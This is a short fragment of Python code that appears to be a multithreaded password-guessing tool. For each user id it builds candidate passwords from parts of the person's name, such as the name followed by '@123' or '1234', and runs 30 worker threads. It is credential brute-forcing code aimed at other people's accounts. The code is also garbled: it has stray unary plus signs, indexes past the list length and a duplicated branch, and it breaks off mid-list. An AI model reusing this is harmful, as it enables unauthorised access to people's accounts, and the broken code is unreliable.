        ...
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    ...
                    if len(xz) >= 5:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', + xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3] + ' ' + xz[4] + ' ' + xz[5]]
                    elif len(xz) <= 1:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', + xz[0] + ' ' + xz[1]]
                    elif len(xz) <= 2:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', + xz[0] + ' ' + xz[1]]
                    elif len(xz) <= 3:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', + xz[0] + ' ' + xz[1]+ ' ' + xz[2] + ' ' + xz[3]]
                    elif len(xz) <= 4:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', + xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3] + ' ' + xz[4]]
                    elif len(xz) <= 3:
                        pws = [
